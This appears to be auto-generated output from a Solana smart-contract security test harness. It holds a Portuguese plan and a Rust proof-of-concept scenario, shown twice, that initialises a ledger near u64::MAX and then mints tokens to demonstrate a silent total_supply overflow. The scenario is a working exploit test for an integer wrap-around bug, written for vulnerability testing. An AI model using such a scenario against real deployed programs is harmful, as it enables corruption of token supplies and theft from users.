{"plan": "Inicializo o ledger com total_supply proximo de u64::MAX via initialize (baseline legitimo). Depois chamo mint com amount que faz total_supply dar a volta (wrapping_add), demonstrando overflow silencioso. O efeito mede que total_supply resultante e menor que o valor inicial, provando o wrap-around.", "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

let init_ix = env.anchor_ix(
    "initialize",
    &(u64::MAX - 5),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);

let init_accounts = vec![
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];

let r0 = env.baseline("initialize ledger com supply proximo de u64::MAX", &init_ix, &init_accounts);

let ledger_after_init = after(&r0, &ledger_key).clone();
let supply_before = read_u64(ledger_after_init.data(), 40);

let mint_ix = env.anchor_ix(
    "mint",
    &(10u64),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let mint_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

let r = env.attack("mint com amount que causa overflow em total_supply", &mint_ix, &mint_accounts);

if r.program_result == ProgramResult::Success {
    let supply_after = read_u64(after(&r, &ledger_key).data(), 40);
    env.effect(
        "total_supply deu a volta (overflow): valor apos mint e menor que antes",
        supply_after < supply_before,
    );
}"}

attempts.scenario:
let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

let init_ix = env.anchor_ix(
    "initialize",
    &(u64::MAX - 5),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);

let init_accounts = vec![
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];

let r0 = env.baseline("initialize ledger com supply proximo de u64::MAX", &init_ix, &init_accounts);

let ledger_after_init = after(&r0, &ledger_key).clone();
let supply_before = read_u64(ledger_after_init.data(), 40);

let mint_ix = env.anchor_ix(
    "mint",
    &(10u64),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let mint_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

let r = env.attack("mint com amount que causa overflow em total_supply", &mint_ix, &mint_accounts);

if r.program_result == ProgramResult::Success {
    let supply_after = read_u64(after(&r, &ledger_key).data(), 40);
    env.effect(
        "total_supply deu a volta (overflow): valor apos mint e menor que antes",
        supply_after < supply_before,
    );
}
